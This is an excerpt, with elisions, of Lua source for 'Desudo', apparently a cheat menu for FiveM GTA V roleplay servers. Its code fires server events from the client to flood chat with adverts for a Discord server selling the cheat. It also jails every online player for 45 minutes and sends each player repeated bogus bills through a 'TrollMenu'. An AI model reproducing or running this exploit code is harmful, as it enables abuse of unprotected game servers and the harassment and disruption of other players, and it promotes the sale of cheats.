                    ...
                    function()
                        ...
                        for i = 0, 256 do
                            ...
                            TriggerServerEvent(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                'Baran#8992 Desudo https://discord.gg/4Cmmn8Z',
                                43161337
                            )
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"Desudo; Baran#8992")
        end
        ...
        while true do
			...
			if chatspam then
                TriggerServerEvent(
                    ...
                    'Baran#8992',
                    {0, 0x99, 255},
                    '/ooc Desudo Cheat! Buy at https://discord.gg/4Cmmn8Z'
                )
                TriggerServerEvent('_chat:messageEntered', 'Baran#8992', {0, 0x99, 255}, 'Desudo Cheat <3 https://discord.gg/4Cmmn8Z')
            end
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "Desudo Cheats <3 Baran#8992 https://discord.gg/4Cmmn8Z")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "Desudo Cheats <3 Baran#8992 https://discord.gg/4Cmmn8Z")
					end
				end
    ...
    function()
        ...
        while Enabled do
            if Plane.IsMenuOpened("MainMenu") then
                ...
                drawNotification("~h~~s~Made by ~b~Baran#8992")
            ...
            elseif Plane.IsMenuOpened("TrollMenu") then
				...
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Desudo menu https://discord.gg/kYyhww", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Desudo menu https://discord.gg/kYyhww", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Desudo menu https://discord.gg/kYyhww", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Desudo menu https://discord.gg/kYyhww", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Desudo menu https://discord.gg/kYyhww", "6969696969")
        ...
        drawNotification(
            ...
            elseif Plane.IsMenuOpened("OnlinePlayersMenu") then
				...
				elseif Plane.IsMenuOpened("Credits") then
				    if Plane.Button("∑~r~~h~Baran#89921 - Owner / Developer") then
				end
				Plane.Display()
